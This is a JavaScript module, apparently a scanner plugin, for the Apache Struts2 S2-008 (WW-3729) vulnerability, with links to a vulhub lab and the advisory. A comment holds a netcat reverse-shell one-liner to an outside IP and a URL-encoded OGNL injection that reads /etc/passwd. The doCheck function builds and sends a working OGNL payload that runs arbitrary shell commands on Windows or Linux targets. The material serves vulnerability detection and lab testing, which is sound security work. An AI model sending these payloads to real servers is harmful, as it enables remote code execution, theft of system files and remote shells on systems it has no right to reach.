module.exports={
	tags:"struts2,008,ww-3729,3729,web",
	des:"WW-3729,struts2 Vulnerability detection",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-008",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-008.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-008",
		"https://issues.apache.org/jira/browse/WW-3729"],
/*
一行反弹shell:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.24.90 4444 >/tmp/f
/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat /etc/passwd%27%29.getInputStream%28%29%29)
*/
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = _t.self;
		var s = "(#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
		+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
		+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + _s.g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + _s.g_szCmd + "\"})"
		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
		+ ",#as=new java.lang.String()"
		+ ",#p.redirectErrorStream(true),#process=#p.start()"
		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
		+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+")";
		_s.request(_s.fnOptHeader({method: 'GET',uri: url + "?debug=command&expression=" + encodeURIComponent(s)
		    })
		  , function (error, response, body){
		  		_s.error(error);
		  		if(body)
		  		{
		  			//console.log(body);
		  			_s.fnShowBody(body);
		  			_s.fnDoBody(body,"s2-008",url,null,function(o)
		  			{
		  				var r = {"url":url,"send":s};
  						fnCbk(_s.copyO2O(r,o),_t);
		  			});
		  		}
		    }
		  );
	}
};